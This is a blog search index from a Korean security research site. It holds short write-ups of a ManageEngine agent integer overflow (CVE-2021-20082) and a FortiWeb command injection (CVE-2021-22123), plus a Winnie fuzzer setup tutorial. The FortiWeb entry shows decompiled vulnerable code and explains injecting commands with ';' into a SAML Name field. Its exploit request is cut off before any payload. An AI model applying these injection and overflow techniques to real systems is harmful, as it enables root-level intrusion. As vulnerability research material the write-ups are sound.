<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021–20082: Integer Overflow to RCE — ManageEngine Asset Explorer Agent</title>
    <link href="/2021/08/23/fabu1ous/2021-08-23/"/>
    <url>/2021/08/23/fabu1ous/2021-08-23/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/tenable-techblog/integer-overflow-to-rce-manageengine-asset-explorer-agent-cve-2021-20082-7e54cb2caad5">Integer Overflow to RCE</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>ManageEngine Asset Explorer Agent</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>ManageEngine Windows agent&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC19;&#xC740; &#xB124;&#xD2B8;&#xC6CC;&#xD06C;&#xC5D0; &#xC788;&#xB2E4;&#xBA74; IP spoofing&#xACFC; integer overflow&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>ManageEngine Windows agent&#xB294; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xBA70; ManageEngine server&#xB85C;&#xBD80;&#xD130; &#xC624;&#xB294; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xCEE4;&#xBA58;&#xB4DC;&#xB97C; listen &#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; agent&#xB294; &#xC801;&#xC808;&#xD55C; &#xC778;&#xC99D; &#xC808;&#xCC28;&#xAC00; &#xC5C6;&#xC774; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xCEE4;&#xBA58;&#xB4DC;&#xC758; &#xBC1C;&#xC2E0;&#xC9C0; IP&#xAC00; MangeEngine server&#xC778;&#xC9C0;&#xB9CC; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; network&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xB204;&#xAD6C;&#xB098; TLS handshake&#xB97C; &#xD1B5;&#xD574; &#xCEE4;&#xBA58;&#xB4DC;&#xB97C; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xACE0;, IP spoofing&#xC744; &#xD1B5;&#xD574; &#xCEE4;&#xBA58;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>ManageEngine Windows agent&#xB294;  ManageEngine server&#xB85C;&#xBD80;&#xD130; POST request&#xB97C; &#xBC1B;&#xC544; <code>HttpQueryInfoW</code> API&#xB97C; &#xC0AC;&#xC6A9;&#xD574; http handling&#xC744; &#xD569;&#xB2C8;&#xB2E4;. <code>Content-Size</code> &#xD544;&#xB4DC; &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD574; POST request&#xC758; data&#xB4E4;&#xC744; &#xC800;&#xC7A5;&#xD560; &#xBA54;&#xBAA8;&#xB9AC; &#xACF5;&#xAC04;&#xC744; heap&#xC5D0; &#xD560;&#xB2F9;&#xD558;&#xB294;&#xB370;, &#xD560;&#xB2F9;&#xB420; &#xD06C;&#xAE30;&#xB97C; &#xACC4;&#xC0B0;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>(<code>Content-Size</code> + 1) * 4 + 2</li></ul><p>ManageEngine Windows agent&#xB294; 32-bite agent&#xC774;&#xBBC0;&#xB85C; <code>Content-Size</code> &#xD544;&#xB4DC; &#xAC12;&#xC774; UNIT32_MAX/4&#xB77C;&#xBA74; &#xC704; &#xACC4;&#xC0B0;&#xC758; &#xACB0;&#xACFC;&#xB294; integer overflow&#xB85C; &#xC778;&#xD574; 2&#xAC00; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; Heap over flow&#xB85C; &#xC5F0;&#xC7A5;&#xC2DC;&#xCF1C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC744; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.  </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>spoofing</tag>
      
      <tag>post</tag>
      
      <tag>integer overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Harness 짜기 싫어 쓰는 Winnie 연구글 Part2</title>
    <link href="/2021/08/22/fabu1ous/winnie-2/"/>
    <url>/2021/08/22/fabu1ous/winnie-2/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xBA38;&#xB9BF;&#xB9D0;"><a href="#&#xBA38;&#xB9BF;&#xB9D0;" class="headerlink" title="&#xBA38;&#xB9BF;&#xB9D0;"></a>&#xBA38;&#xB9BF;&#xB9D0;</h1><p><img src="/2021/08/22/fabu1ous/winnie-2/1.png" alt></p><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. Fabu1ous &#xC785;&#xB2C8;&#xB2E4;. &#xC800;&#xBC88;&#xC5D4; Winnie&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xC744; &#xD588;&#xC73C;&#xB2C8; &#xC774;&#xBC88;&#xC5D4; &#xC2E4;&#xC81C;&#xB85C; &#xC0AC;&#xC6A9;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;. WinAFL&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xD37C;&#xC800;&#xB85C; code coverage&#xB97C; &#xB298;&#xB9AC;&#xAE30; &#xC704;&#xD574; &#xC0AC;&#xC6A9;&#xD558;&#xB358; &#xAE30;&#xC874; &#xBC29;&#xC2DD;&#xC778; Intel PT&#xB098; DynamoRIO &#xB300;&#xC2E0; basic-block breakpoint&#xC640; fork&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; WinAFL&#xACFC; &#xC0AC;&#xC6A9;&#xBC95;&#xC774; &#xD06C;&#xAC8C; &#xB2E4;&#xB974;&#xC9C4; &#xC54A;&#xC9C0;&#xB9CC; &#xC0AC;&#xC804; &#xC791;&#xC5C5;&#xC774; &#xC870;&#xAE08; &#xB2E4;&#xB985;&#xB2C8;&#xB2E4;. &#xC624;&#xB298;&#xC740; Winnie&#xB97C; &#xC4F0;&#xAE30; &#xC704;&#xD574; &#xD574;&#xC57C; &#xD558;&#xB294; &#xC0AC;&#xC804;&#xC791;&#xC5C5;&#xB4E4;&#xC744; &#xC54C;&#xC544;&#xBCF4;&#xACE0; Winnie&#xB97C; &#xC2E4;&#xD589;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><h1 id="Winnie"><a href="#Winnie" class="headerlink" title="Winnie"></a>Winnie</h1><p><a href="https://github.com/sslab-gatech/winnie">sslab-gatech/winnie</a></p><p>&#xC6B0;&#xC120; Winnie &#xACF5;&#xC2DD; github&#xC5D0; &#xAC00;&#xC154;&#xC11C; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD569;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/2.png" alt></p><h1 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h1><p>forklib&#xB294; unix &#xACC4;&#xC5F4; OS&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; fork()&#xB97C; windows&#xC5D0; &#xD3EC;&#xD305;&#xD55C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB85C;</p><p>csrss.dll&#xACFC; ntdll.dll&#xC744; &#xB9AC;&#xBC84;&#xC2F1; &#xD574; &#xC5BB;&#xC740; offset&#xB4E4;&#xC774; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB418;&#xC5B4;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xB9DE;&#xAC8C; &#xCEF4;&#xD30C;&#xC77C;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xD544;&#xC694;&#xD55C; &#xC624;&#xD504;&#xC14B;&#xB4E4;&#xC744; &#xC54C;&#xC544;&#xC11C; &#xD30C;&#xC2F1; &#xD574;&#xC624;&#xB294; python &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xAC19;&#xC774; &#xC81C;&#xACF5;&#xD558;&#xACE0; &#xC788;&#xC5B4;&#xC11C; &#xC800;&#xD76C;&#xB294; &#xC2E4;&#xD589;&#xB9CC; &#xD574;&#xC8FC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/3.png" alt></p><p><code>gen_csrss_offsets.py</code> &#xC774;&#xB188;&#xB9CC; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C;&#xC8FC;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. python 3&#xB294; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xACE0; &#xD558;&#xB2C8; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; python 2&#xB97C; &#xC124;&#xCE58;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC800;&#xC758; &#xACBD;&#xC6B0; python2.7.13&#xC744; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/4.png" alt></p><p>&#xC8FC;&#xC758;&#xD558;&#xC2E4; &#xC810;&#xC740; python2-x64&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC154;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. 32-bit&#xC6A9; pyhton &#xB610;&#xD55C; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>python2&#xB97C; &#xC124;&#xCE58;&#xD558;&#xC168;&#xB2E4;&#xBA74; &#xC544;&#xB798; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xCC28;&#xB798;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xD574;&#xC8FC;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">python -m pip install --upgrade pippython -m pip install construct pefilepython ./gen_csrss_offsets.py</code></pre><p><img src="/2021/08/22/fabu1ous/winnie-2/5.png" alt></p><p><code>csrss_offset.h</code>&#xB97C; &#xC0DD;&#xC131;&#xD588;&#xB2E4;&#xB294; &#xBB38;&#xAD6C;&#xB97C; &#xD655;&#xC778;&#xD558;&#xC168;&#xB2E4;&#xBA74; &#xC131;&#xACF5;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/6.png" alt></p><p>&#xC0DD;&#xC131;&#xB41C; <code>csrss_offsets.h</code> &#xD574;&#xB354; &#xD30C;&#xC77C;&#xC5D0;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xB9DE;&#xB294; offset&#xB4E4;&#xC774; &#xB2F4;&#xACA8;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/7.png" alt></p><p>&#xC790;, &#xC774;&#xC81C; &#xC2E4;&#xC81C;&#xB85C; &#xBE4C;&#xB4DC;&#xB97C; &#xD560; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;. FullSpeed.sln &#xC194;&#xB8E8;&#xC158;&#xC744; VisualStudio2017 &#xD639;&#xC740; VisualStudio2019&#xC73C;&#xB85C; &#xC5F4;&#xC5B4; Realease x64 configuration&#xC73C;&#xB85C; &#xBE4C;&#xB4DC;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC800;&#xB294; VisualStudio2019&#xB97C; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/8.png" alt></p><p>&#xBE4C;&#xB4DC;&#xB97C; &#xC131;&#xACF5;&#xC801;&#xC73C;&#xB85C; &#xB9C8;&#xCE58;&#xC168;&#xB2E4;&#xBA74; winnie-master&#xD3F4;&#xB354; &#xB0B4;&#xBD80;&#xC5D0; x64&#xB77C;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xD3F4;&#xB354;&#xAC00; &#xC0DD;&#xC131;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD558;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Ready-to-Fuzz"><a href="#Ready-to-Fuzz" class="headerlink" title="Ready to Fuzz"></a>Ready to Fuzz</h1><p><img src="/2021/08/22/fabu1ous/winnie-2/9.png" alt></p><p>Winnie&#xC758; &#xAE43;&#xD5D9;&#xC5D0;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; Toy example&#xC744; &#xD1B5;&#xD574; winnie&#xC758; &#xC0AC;&#xC6A9;&#xBC95;&#xC744; &#xC54C;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;. &#xC6B0;&#xC120; <code>winnie-master/samples/toy_example</code> &#xACBD;&#xB85C;&#xB85C; &#xC774;&#xB3D9;&#xD574; <code>toy_example.sln</code> &#xC194;&#xB8E8;&#xC158;&#xC744; &#xBE4C;&#xB4DC;&#xD574;&#xC90D;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/10.png" alt></p><p>Release x64&#xB85C; &#xBE4C;&#xB4DC;&#xB97C; &#xB9C8;&#xCE58;&#xC168;&#xB2E4;&#xBA74; Toy example &#xD3F4;&#xB354;&#xC5D0; x64&#xB77C;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xD3F4;&#xB354;&#xAC00; &#xC0DD;&#xC131;&#xB41C; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD558;&#xC2E4; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; &#xC800;&#xD76C;&#xAC00; &#xC0AC;&#xC6A9;&#xD560; 3&#xAC00;&#xC9C0; &#xD30C;&#xC77C;&#xC744; &#xBCF5;&#xC0AC;&#xD574; afl-fuzz.exe&#xC640; &#xAC19;&#xC740; &#xD3F4;&#xB354;&#xB85C; &#xC62E;&#xAE30;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC608;&#xC2DC; input &#xD30C;&#xC77C; &#xB610;&#xD55C; &#xC81C;&#xACF5;&#xD574; &#xC8FC;&#xB2C8; &#xC774;&#xAC83;&#xB3C4; &#xBCF5;&#xC0AC;&#xD574;&#xC90D;&#xC2DC;&#xB2E4;.</p><ul><li>example_library.dll : target module&#xC774; &#xB420; dll&#xC785;&#xB2C8;&#xB2E4;.</li><li>harness.dll : winnie&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; harness&#xC758; &#xAC00;&#xC7A5; &#xAE30;&#xBCF8;&#xC801;&#xC778; &#xC608;&#xC2DC;&#xC785;&#xB2C8;&#xB2E4;.</li><li>toy_example.exe : target program&#xC774; &#xB420; &#xBA54;&#xC778; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC785;&#xB2C8;&#xB2E4;.</li></ul><p><img src="/2021/08/22/fabu1ous/winnie-2/11.png" alt></p><p><code>winnie-master/x64/Release</code> &#xACBD;&#xB85C;(&#xC774;&#xD558; working directory)&#xB85C; &#xC774;&#xB3D9;&#xD574; &#xC704;&#xC5D0;&#xC11C; &#xC5B8;&#xAE09;&#xD55C; &#xC138; &#xAC1C;&#xC758; &#xD30C;&#xC77C;&#xACFC; &#xC608;&#xC81C; input&#xC758; &#xBCF5;&#xC0AC;&#xBCF8;&#xC744; &#xC0DD;&#xC131;&#xD574;&#xC8FC;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/12.png" alt></p><p>&#xC800;&#xBC88; Part&#xC5D0;&#xC11C; &#xAC04;&#xB7B5;&#xD558;&#xAC8C; &#xC124;&#xBA85;&#xD588;&#xB4EF;&#xC774; winnie&#xC758; full-speed instrumentation&#xC740; basic block&#xB2E8;&#xC704;&#xB85C; break point&#xB97C; &#xAC78;&#xC5B4; coverage&#xB97C; &#xAE30;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; target module&#xC758; basic block&#xC5D0; &#xB300;&#xD55C; &#xC8FC;&#xC18C;&#xB4E4;&#xC744; &#xC694;&#xAD6C;&#xD558;&#xB294;&#xB370; &#xC774;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xC744; basic-block-file(bb-file)&#xC774;&#xB77C; &#xBD80;&#xB985;&#xB2C8;&#xB2E4;. winnie&#xC5D0; &#xD3EC;&#xD568;&#xB41C; bb.py&#xB77C;&#xB294; IDA&#xC6A9; python script&#xB97C; &#xC0AC;&#xC6A9;&#xD574; bb-file&#xC744; &#xC0DD;&#xC131;&#xD574; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/13.png" alt></p><p>&#xAC01; &#xBAA8;&#xB4C8;&#xC744; IDA Pro&#xB85C; &#xC5F4;&#xACE0; [&#xC0C1;&#xB2E8;&#xBA54;&#xB274; &gt; File &gt; Script file&#x2026;]&#xC744; &#xD1B5;&#xD574; bb.py&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C; working directory&#xC5D0; basicblocks.bb&#xB77C;&#xB294; &#xD30C;&#xC77C;&#xC774; &#xC0DD;&#xC131;&#xD574;&#xC8FC;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC800;&#xD76C;&#xC758; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; toy_example.exe&#xC640; example_library.dll, &#xCD1D; 2&#xAC1C;&#xC758; &#xBAA8;&#xB4C8;&#xC5D0; &#xB300;&#xD55C; bb &#xC815;&#xBCF4;&#xB97C; &#xD68D;&#xB4DD;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; basicblocks.bb&#xB77C;&#xB294; &#xD30C;&#xC77C;&#xC774; &#xC774;&#xBBF8; &#xC0DD;&#xC131; &#xACBD;&#xB85C;&#xC5D0; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xBA74; &#xB36E;&#xC5B4;&#xC4F0;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C; &#xAE30;&#xC874; &#xB0B4;&#xC6A9;&#xC5D0; &#xC0C8;&#xB85C;&#xC6B4; bb &#xC815;&#xBCF4;&#xAC00; &#xCD94;&#xAC00;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/22/fabu1ous/winnie-2/14.png" alt></p><p>&#xC704; &#xC0AC;&#xC9C4;&#xC740; &#xC0DD;&#xC131;&#xB41C; bb-file&#xC758; &#xC77C;&#xBD80; &#xBAA8;&#xC2B5;&#xC785;&#xB2C8;&#xB2E4;. &#xC0DD;&#xC131;&#xB41C; bb-file&#xC5D0; toy_example.exe&#xC640; example_library.dll&#xC758; bb &#xC815;&#xBCF4;&#xAC00; &#xBAA8;&#xB450; &#xB4E4;&#xC5B4;&#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD558;&#xC168;&#xB2E4;&#xBA74; &#xD37C;&#xC9D5; &#xD560; &#xC900;&#xBE44;&#xB294; &#xB05D;&#xB0AC;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h1><pre><code class="hljs bash">afl-fuzz [AFL &#xC635;&#xC158;] -- [fullspeed &#xC635;&#xC158;] -- [fork server &#xC635;&#xC158;] -- [target argv]</code></pre><p>Winnie&#xB85C; &#xD37C;&#xC9D5;&#xC744; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xB294; &#xC704;&#xACFC; &#xAC19;&#xC740; &#xD615;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;. &#xAC01;&#xAC01; &#xC635;&#xC158;&#xB4E4;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>AFL &#xC635;&#xC158; : input &#xBC0F; output &#xD30C;&#xC77C; &#xACBD;&#xB85C;, &#xD0C0;&#xC784; &#xC544;&#xC6C3; &#xC124;&#xC815;</li><li>fullspeed &#xC635;&#xC158; : fullspeed intrumentation&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB4E4;(&#xC608;&#xB97C; &#xB4E4;&#xBA74; bb-file)</li><li>fork server &#xC635;&#xC158; : harness&#xC758; &#xACBD;&#xB85C; &#xC9C0;&#xC815;, fork server&#xC758; &#xB3D9;&#xC791; &#xC124;&#xC815;</li><li>target argv : target program &#xACBD;&#xB85C; &#xBC0F; &#xC544;&#xADDC;&#xBA3C;&#xD2B8; &#xC124;&#xC815;</li></ul><pre><code class="hljs bash">afl-fuzz -i <span class="hljs-keyword">in</span> -o out -t 1000 -I 1000 -- -bbfile basicblocks.bb -- -harness harness.dll -no_minidumps -- toy_example @@</code></pre><h1 id="&#xB2E4;&#xC74C;-&#xD30C;&#xD2B8;-&#xC608;&#xACE0;"><a href="#&#xB2E4;&#xC74C;-&#xD30C;&#xD2B8;-&#xC608;&#xACE0;" class="headerlink" title="&#xB2E4;&#xC74C; &#xD30C;&#xD2B8; &#xC608;&#xACE0;"></a>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8; &#xC608;&#xACE0;</h1><p>&#xC800;&#xBC88; Winnie Part 1&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xB300;&#xB85C; Winnie&#xB294; 2&#xAC1C;&#xC758; &#xB2E8;&#xACC4;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAE30;&#xC874; &#xD37C;&#xC800;&#xB4E4;&#xACFC; &#xB2E4;&#xB978; &#xCC28;&#xBCC4;&#xC810;&#xC774;&#xC790; Winnie&#xC5D0;&#xC11C; &#xC8FC;&#xBAA9;&#xD574;&#xC57C; &#xD560; &#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><ol><li><p>Semi-automated Harness Generater</p><p>Winnie &#xB610;&#xD55C; WinAFL&#xC5D0;&#xC11C; &#xD30C;&#xC0DD;&#xB41C; fuzzer&#xC774;&#xBBC0;&#xB85C; Harness &#xC791;&#xC131;&#xC774; &#xD544;&#xC694;&#xD569;&#xB2C8;&#xB2E4;. Winnie&#xB97C; &#xC8FC;&#xC81C;&#xB85C; &#xAE00;&#xC744; &#xC4F0;&#xAE30; &#xC2DC;&#xC791;&#xD55C; &#xC774;&#xC720;&#xC778; &#xC790;&#xB3D9; Harness &#xC0DD;&#xC131;&#xAE30;&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xBCF4;&#xACE0; &#xADF8; &#xB3D9;&#xC791;&#xC744; &#xBD84;&#xC11D;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p></li><li><p>Full Speed instrumentation Fuzzing</p><p>Winnie&#xB294; fork&#xC640; basic-block &#xB2E8;&#xC704; breakpoint&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; full speed instrumentation fuzzing&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xBA74; fork&#xC758; windows &#xD3EC;&#xD305;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xAD6C;&#xC131;&#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>fuzzing</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>harness</tag>
      
      <tag>bug bounty</tag>
      
      <tag>winnie</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄]  CVE-2021-22123 : Fortinet FortiWeb OS Command Injection</title>
    <link href="/2021/08/20/j0ker/2021-08-20/"/>
    <url>/2021/08/20/j0ker/2021-08-20/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p> <a href="https://www.rapid7.com/blog/post/2021/08/17/fortinet-fortiweb-os-command-injection/">Fortinet FortiWeb OS Command Injection</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>FortiWeb OS</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Fortinet&#xC758; FortiWeb&#xC740; &#xC6F9; &#xBC29;&#xD654;&#xBCBD;(Web Application Firewall, WAF) &#xC81C;&#xD488;&#xC774;&#xBA70; &#xC548;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; FortiWeb OS&#xC5D0;&#xC11C; &#xC778;&#xC99D; &#xC5C6;&#xC774; &#xC6D0;&#xACA9;&#xC5D0;&#xC11C; Command Injection&#xC744; &#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">move_metafile</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *path,<span class="hljs-keyword">char</span> *name)</span></span><span class="hljs-function"></span>{<span class="hljs-keyword">int</span> iVar1;<span class="hljs-keyword">char</span> buf [<span class="hljs-number">512</span>];<span class="hljs-keyword">int</span> nret;<span class="hljs-built_in">snprintf</span>(buf,<span class="hljs-number">0x200</span>,<span class="hljs-string">&quot;%s/%s&quot;</span>,<span class="hljs-string">&quot;/data/etc/saml/shibboleth/service_providers&quot;</span>,name);iVar1 = access(buf,<span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> (iVar1 != <span class="hljs-number">0</span>) {<span class="hljs-built_in">snprintf</span>(buf,<span class="hljs-number">0x200</span>,<span class="hljs-string">&quot;mkdir %s/%s&quot;</span>,<span class="hljs-string">&quot;/data/etc/saml/shibboleth/service_providers&quot;</span>,name);iVar1 = system(buf); <span class="hljs-comment">// here</span><span class="hljs-keyword">if</span> (iVar1 != <span class="hljs-number">0</span>) {<span class="hljs-keyword">return</span> iVar1;}}<span class="hljs-built_in">snprintf</span>(buf,<span class="hljs-number">0x200</span>,<span class="hljs-string">&quot;cp %s %s/%s/%s.%s&quot;</span>,path,<span class="hljs-string">&quot;/data/etc/saml/shibboleth/service_providers&quot;</span>,name,<span class="hljs-string">&quot;Metadata&quot;</span>,&amp;DAT_00212758);iVar1 = system(buf); <span class="hljs-comment">// here</span><span class="hljs-keyword">return</span> iVar1;}</code></pre><p>&#xC774; &#xD568;&#xC218;&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xC778;&#xC790; name&#xC5D0;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; SAML Server &#xC124;&#xC815; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xC785;&#xB825;&#xD55C; &#x201C;Name&#x201D; &#xC785;&#xB825;&#xB780;&#xC5D0; &#xC785;&#xB825;&#xD55C; &#xB0B4;&#xC6A9;&#xC774; &#xADF8;&#xB300;&#xB85C; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#x201C;;&#x201D;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC6D0;&#xD558;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC785;&#xB825;&#xD558;&#xBA74; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC775;&#xC2A4;&#xCF54;&#xB4DC; &#xC608;&#xC2DC;&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">POST /api/v2<span class="hljs-number">.0</span>/user/remoteserver.saml HTTP/<span class="hljs-number">1.1</span>Host: [redacted]Cookie: [redacted]User-Agent: [redacted]Accept: 